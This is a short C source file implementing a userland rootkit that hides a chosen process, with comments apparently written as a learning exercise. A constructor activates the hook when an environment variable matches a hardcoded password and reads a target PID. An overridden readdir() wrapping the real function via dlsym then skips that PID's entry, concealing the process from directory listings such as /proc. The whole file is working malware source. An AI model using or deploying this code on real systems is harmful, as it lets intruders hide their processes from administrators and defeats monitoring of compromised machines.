#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>


/* We define global variables : 
PID_TO_HIDE is the PID number of the program we want to hide
ROOTKIT_PWD is a password to activate the hook 
hook_active shows if the hook is active or not*/



char *PID_TO_HIDE;
char *ROOTKIT_PWD;
int hook_active = 0;


/* First, we build an attribute that is being called before a function (here before the function readdir)*/
__attribute__((constructor)) void mon_hook(void) 
 {
    /* We verify that the password is not NULL and if it is correct, if it is then we get the PID*/
    ROOTKIT_PWD = getenv("ROOTKIT_PWD");
    if (ROOTKIT_PWD != NULL) {
        if (strcmp(ROOTKIT_PWD, "password123") == 0){
            PID_TO_HIDE = getenv("HIDE_ME_PID");
            hook_active = 1;
            unsetenv("ROOTKIT_PWD");
            unsetenv("HIDE_ME_PID");
        }
    }
    
    printf("PID récupéré : %s\n", PID_TO_HIDE);
    
    
}


/*We redefine the function that we want to impersonate and alter its behaviour*/

struct dirent *readdir(DIR *dirp) {

    /*We hook the call of the function readdir*/
    struct dirent * (*real_function)(DIR *) = dlsym(RTLD_NEXT, "readdir");

    
    if(real_function != NULL) {
    
        struct dirent * unmodified_value = real_function(dirp);
    
        /*We loop until we get the value we want to modify (if it exists)*/
        while (unmodified_value != NULL) {
                if (PID_TO_HIDE != NULL 
                    && strcmp(unmodified_value->d_name, PID_TO_HIDE) == 0 
                    && hook_active == 1) 
                    
                    /* If it exists, we modify the behaviour by calling it again thus hiding the PID*/
                    {
                        unmodified_value = real_function(dirp);
                    }

                else 
                {
                    /* If we don't find it we return the same as the normal function*/
                    return unmodified_value;
                }
        
            
        }

    }

    return NULL;
    
}



